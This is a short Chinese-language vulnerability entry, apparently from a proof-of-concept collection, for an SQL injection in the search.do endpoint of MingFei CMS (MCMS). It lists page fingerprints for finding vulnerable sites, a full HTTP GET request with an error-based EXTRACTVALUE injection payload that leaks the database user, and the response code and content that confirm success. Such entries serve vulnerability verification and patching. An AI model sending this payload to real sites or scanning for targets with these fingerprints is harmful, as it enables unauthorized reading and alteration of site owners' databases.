﻿# 铭飞CMS-SQL注入-search

> 更新时间：2024-05-20

> 漏洞编号：

> 漏洞说明：铭飞CMS search 接口处存在SQL注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。 

> 漏洞特征：body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"

> 验证脚本：HTTP

```
GET /mcms/search.do'%20AND%20EXTRACTVALUE(5225,CONCAT(0x5c,111*111,user(),0x71767a7071))%20AND%20'smmD'='smmD=1 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

```

> 响应代码特征：500

> 响应内容特征：12321

> 上传文件定位：

> 验证文件来源：铭飞CMS-SQL注入-search.poc

